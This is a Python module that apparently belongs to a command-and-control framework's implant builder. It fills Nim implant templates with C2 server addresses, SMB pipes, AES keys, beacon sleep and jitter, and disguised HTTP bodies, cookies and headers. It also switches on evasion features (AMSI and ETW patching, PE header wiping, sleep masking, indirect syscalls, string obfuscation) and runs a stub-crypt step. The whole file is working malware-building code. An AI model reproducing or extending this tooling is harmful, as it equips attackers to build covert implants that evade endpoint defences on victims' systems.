import base64
import binascii
import os
import secrets
import string

from ...blocking_io import run_in_thread

from infra.database.database import AesKeys, sqlite_db
from launcher.utils.config import config

from .....utils import parse_server
from .paths import implants_root
from .placeholders import custom_nim, custom_routine_nim, global_nim
from .stub_crypt import stub_replacements

tmpdir = None
file_backups = {}


def backup_before_write(path):
    # Saves the file before it is patched
    path = os.path.abspath(path)
    if path in file_backups:
        return
    if os.path.isfile(path):
        with open(path, "rb") as f:
            file_backups[path] = f.read()
    else:
        file_backups[path] = None


def generate_aes_key():
    # Creates a random aes key
    return base64.b64encode(secrets.token_bytes(32)).decode()


def load_relay_aes_key():
    # Loads the relay aes key from the config
    """Return relay key as base64(32 bytes) for implant crypt (same encoding as aesKey)."""
    key = str((config.get("implants") or {}).get("relay_aes_key") or "").strip()
    if not key:
        raise ValueError("implants.relay_aes_key is not set in server.conf")
    try:
        raw = base64.b64decode(key, validate=True)
        if len(raw) == 32:
            return base64.b64encode(raw).decode("ascii")
    except (binascii.Error, ValueError):
        pass
    try:
        raw = bytes.fromhex(key)
    except ValueError:
        raise ValueError(
            "implants.relay_aes_key must be base64 (32 bytes) or hexadecimal"
        ) from None
    if len(raw) < 32:
        raise ValueError("implants.relay_aes_key must decode to at least 32 bytes")
    return base64.b64encode(raw[:32]).decode("ascii")


async def save_aes_implant(tag, key):
    # Stores the implant aes key
    existing = await sqlite_db.read(AesKeys, tag=tag)
    if existing:
        await sqlite_db.modify(AesKeys, {"tag": tag}, {"key": key})
    else:
        await sqlite_db.write(AesKeys(tag=tag, key=key))


def cleanup(dest=None):
    # Restores the patched files
    global tmpdir
    for path, content in list(file_backups.items()):
        if content is None:
            if os.path.isfile(path):
                os.remove(path)
        else:
            with open(path, "wb") as f:
                f.write(content)
    file_backups.clear()

    root = dest or tmpdir
    if root:
        rel = os.path.relpath(root, implants_root()).replace("\\", "/")
        text = global_nim.get(rel)
        if text:
            with open(os.path.join(root, "utils", "global.nim"), "w", encoding="utf-8") as f:
                f.write(text)
        routine_text = custom_routine_nim.get(rel)
        if routine_text:
            routine_path = os.path.join(root, "routine", "custom.nim")
            if os.path.isfile(routine_path):
                with open(routine_path, "w", encoding="utf-8") as f:
                    f.write(routine_text)

    tmpdir = None


def cleanup_preface(dest):
    # Restores the preface file
    if not dest:
        return
    rel = os.path.relpath(dest, implants_root()).replace("\\", "/")
    text = custom_nim.get(rel)
    if not text:
        return
    with open(os.path.join(dest, "custom.nim"), "w", encoding="utf-8") as f:
        f.write(text)


def nim_str(value) -> str:
    # Escapes a value for a nim string
    escaped = (
        str(value)
        .replace("\\", "\\\\")
        .replace('"', '\\"')
        .replace("\n", "\\n")
        .replace("\r", "\\r")
        .replace("\t", "\\t")
    )
    return f'"{escaped}"'


def body_content_map(config) -> dict:
    # Reads the body content map from the config
    raw = config.get("body_content")
    if isinstance(raw, dict):
        return raw
    return {
        "type": config.get("request_body_type", "off"),
        "request_body": config.get("request_body", ""),
        "response_body": config.get("response_body", ""),
        "cookies": config.get("custom_cookies") or [],
        "headers": config.get("custom_headers") or [],
    }


def request_body_template(body) -> str:
    # Reads the request body template
    body_type = str(body.get("type") or "off")
    if body_type in ("off", "default"):
        return "§content§"
    template = str(body.get("request_body") or body.get("template") or "").strip()
    return template or "§content§"


def response_body_template(body) -> str:
    # Reads the response body template
    body_type = str(body.get("type") or "off")
    if body_type in ("off", "default"):
        return "§content§"
    template = str(body.get("response_body") or body.get("response_template") or "").strip()
    return template or "§content§"


def format_key_value_table(items) -> str:
    # Builds a nim table from key value pairs
    pairs = []
    for item in items or []:
        if isinstance(item, dict) and str(item.get("key") or "").strip():
            pairs.append((str(item["key"]).strip(), str(item.get("value") or "")))
    if not pairs:
        return "initTable[string, string]()"
    entries = ", ".join(f"({nim_str(key)}, {nim_str(val)})" for key, val in pairs)
    return f"toTable([{entries}])"


def format_body_content_table(config) -> str:
    # Builds the nim table for the body content
    body = body_content_map(config)
    template = request_body_template(body)
    if str(body.get("type") or "off") in ("off", "default"):
        pairs = [("template", "§content§")]
    else:
        pairs = [("template", template)]
    entries = ", ".join(f"({nim_str(key)}, {nim_str(val)})" for key, val in pairs)
    return f"toTable([{entries}])"


def patch_files(tmp_path, reps):
    # Replaces placeholders in the source files
    if isinstance(reps, dict):
        pairs = sorted(reps.items(), key=lambda item: len(item[0]), reverse=True)
    else:
        pairs = reps

    for root, dirs, files in os.walk(tmp_path):
        dirs[:] = [d for d in dirs if d != "nimcache" and d != ".git"]
        for name in files:
            if name == "macro.nim":
                continue
            if not name.endswith(".nim") and not name.endswith(".s"):
                continue
            path = os.path.join(root, name)
            with open(path, encoding="utf-8") as f:
                text = f.read()
            orig = text
            if not any(old in orig for old, new in pairs):
                continue
            backup_before_write(path)
            for old, new in pairs:
                text = text.replace(old, new)
            if text != orig:
                with open(path, "w", encoding="utf-8") as f:
                    f.write(text)


def parse_int(config, key, default, lo=None, hi=None):
    # Reads an int from the config inside the limits
    try:
        n = int(str(config.get(key, default)).strip())
    except ValueError:
        n = default
    if lo is not None and n < lo:
        n = lo
    if hi is not None and n > hi:
        n = hi
    return n


def inject_custom_channel_sync(config, dest):
    # Writes the custom channel into the source
    if "custom_channel" not in config:
        return
    content = str(config["custom_channel"]).strip()
    if not content:
        return
    rel = os.path.relpath(dest, implants_root()).replace("\\", "/")
    if rel in ("windows/stageless", "linux/stageless", "linux/loader", "windows/loader"):
        path = os.path.join(dest, "routine", "custom.nim")
        content = content.replace("../../utils/", "../utils/")
        content = content.replace("../../capabilities/", "../capabilities/")
    else:
        path = os.path.join(dest, "routine", "custom", "core.nim")
    os.makedirs(os.path.dirname(path), exist_ok=True)
    backup_before_write(path)
    with open(path, "w", encoding="utf-8") as f:
        f.write(content.rstrip() + "\n")


async def inject_custom_channel(config, dest):
    # Writes the custom channel into the source in a thread
    await run_in_thread(inject_custom_channel_sync, config, dest)


def inject_custom_http_relay_sync(config, dest):
    # Writes the custom http relay into the source
    if "custom_http_relay" not in config:
        return
    content = str(config["custom_http_relay"]).strip()
    if not content:
        return
    rel = os.path.relpath(dest, implants_root()).replace("\\", "/")
    if rel not in ("windows/stageless", "linux/stageless"):
        return
    path = os.path.join(dest, "capabilities", "relay", "http_custom.nim")
    os.makedirs(os.path.dirname(path), exist_ok=True)
    backup_before_write(path)
    with open(path, "w", encoding="utf-8") as f:
        f.write(content.rstrip() + "\n")


async def inject_custom_http_relay(config, dest):
    # Writes the custom http relay into the source in a thread
    await run_in_thread(inject_custom_http_relay_sync, config, dest)


def inject_preface_sync(config, dest):
    # Writes the preface into the source
    cleanup_preface(dest)

    preface = str(config.get("preface", "")).strip()
    if not preface:
        return

    custom_path = os.path.join(dest, "custom.nim")
    existing = ""
    if os.path.isfile(custom_path):
        with open(custom_path, encoding="utf-8") as f:
            existing = f.read()

    default = "proc preface*() = discard\n"
    if existing.strip() and existing != default:
        content = f"\n{preface.rstrip()}\n\n{existing.lstrip()}"
    else:
        content = "\n".join(["", preface.rstrip(), "", "proc preface*() =", "  discard"]) + "\n"

    backup_before_write(custom_path)
    with open(custom_path, "w", encoding="utf-8") as f:
        f.write(content)


async def inject_preface(config, dest):
    # Writes the preface into the source in a thread
    await run_in_thread(inject_preface_sync, config, dest)


async def replace(tmp_path, config, tag, implant_base="stageless"):
    # Patches the source with the implant config
    global tmpdir
    tmpdir = tmp_path

    build_tag = None
    if str(config.get("operational_system", "windows")).strip().lower() == "windows":
        build_tag = "".join(
            secrets.choice(string.ascii_lowercase + string.digits) for _ in range(6)
        )

    loader = str(implant_base or "").strip().lower() == "loader"
    protocol = str(config.get("protocol", "")).strip().lower()
    hp = ""
    extra_servers = []
    for key in sorted(config.get("servers") or {}):
        v = str(config["servers"][key]).strip()
        if not v:
            continue
        if not hp:
            hp = v
        else:
            extra_servers.append(v)
    stage_url = host = port = ""
    http_path = "/"
    if protocol == "smb":
        smb_pipe = str(config.get("smb_pipe", "")).strip().replace("/", "\\").strip("\\")
        if smb_pipe:
            host = smb_pipe.split("\\")[0].strip()
        port = "445"
    elif hp:
        if protocol in ("http", "https"):
            host, port, parsed_origin, http_path = parse_server(hp, protocol)
            if loader:
                stage_url = hp.strip() if "://" in hp else parsed_origin
        elif loader:
            stage_url = hp if "://" in hp else f"http://{hp}"
        elif "://" in hp:
            host, port, _, http_path = parse_server(hp, protocol)
        elif ":" in hp:
            host, port, _, http_path = parse_server(
                hp if "://" in hp else f"{protocol or 'tcp'}://{hp.lstrip('/')}",
                protocol if protocol in ("http", "https") else "http",
            )
        else:
            host = hp
    if not port:
        port = "443" if protocol == "https" else "80"
    if protocol in ("http", "https"):
        for extra in extra_servers:
            h, p, _, x = parse_server(extra, protocol)
            if not h:
                continue
            host = f"{host},{h}" if host else h
            port = f"{port},{p}" if port else p
            http_path = f"{http_path},{x or '/'}"

    beacon_sec = parse_int(config, "sleep", 5, 0)
    jitter = parse_int(config, "delay", 20, 0, 100)
    second_enabled = bool(str(config.get("second_delay", "")).strip())
    second_delay = parse_int(config, "second_delay", 0, 0) if second_enabled else 0
    aes_key = generate_aes_key()
    relay_aes_key = load_relay_aes_key()
    await save_aes_implant(tag, aes_key)

    body_map = body_content_map(config)
    reps = {
        "<channel>": str(config.get("protocol", "http")),
        "<hostTag>": str(config.get("host_tag", "")),
        "<pipelineTarget>": str(config.get("smb_pipe", "")).replace("\\", "\\\\"),
        "<aesId>": tag,
        "<aesKey>": aes_key,
        "<aesRelayKey>": relay_aes_key,
        "<syscallMethod>": "indirect",
        "<sleepMask>": str(config.get("sleep_mask", "off")),
        "<etwPatch>": str(config.get("etw_patch", "off")),
        "<amsiPatch>": str(config.get("amsi_patch", "off")),
        "<peHeadersPatch>": str(config.get("pe_headers_patch", "off")),
        "<obfuscationType>": str(config.get("string_obfuscation", "xor")),
        "867530901": str(beacon_sec * 1000 if loader else beacon_sec),
        "867530903": str(beacon_sec),
        "867530902": str(jitter),
        "867530904": str(second_delay),
        "867530905": "true" if second_enabled else "false",
    }
    if not loader:
        reps.update(
            {
                "var bodyContent* = initTable[string, string]()": (
                    f"var bodyContent* = {format_body_content_table(config)}"
                ),
                'obf("<customCommunication>")': (
                    f"obf({nim_str(request_body_template(body_map))})"
                ),
                'obf("<serverResponseTemplate>")': (
                    f"obf({nim_str(response_body_template(body_map))})"
                ),
                "var customCookies* = initTable[string, string]()": (
                    f"var customCookies* = {format_key_value_table(body_map.get('cookies'))}"
                ),
                "var customHeaders* = initTable[string, string]()": (
                    f"var customHeaders* = {format_key_value_table(body_map.get('headers'))}"
                ),
            }
        )

    if loader:
        reps["<url>"] = stage_url
    else:
        reps["<host>"] = host
        reps["<port>"] = port
        reps["<path>"] = http_path or "/"

    if build_tag:
        reps["<buildTag>"] = build_tag

    # ================ STUB CRYPT ================
    stub_reps = await run_in_thread(
        stub_replacements, tmp_path, str(config.get("arch", "x64"))
    )
    if stub_reps:
        reps.update(stub_reps)
    # ============================================
    
    await run_in_thread(patch_files, tmp_path, reps)
    return build_tag
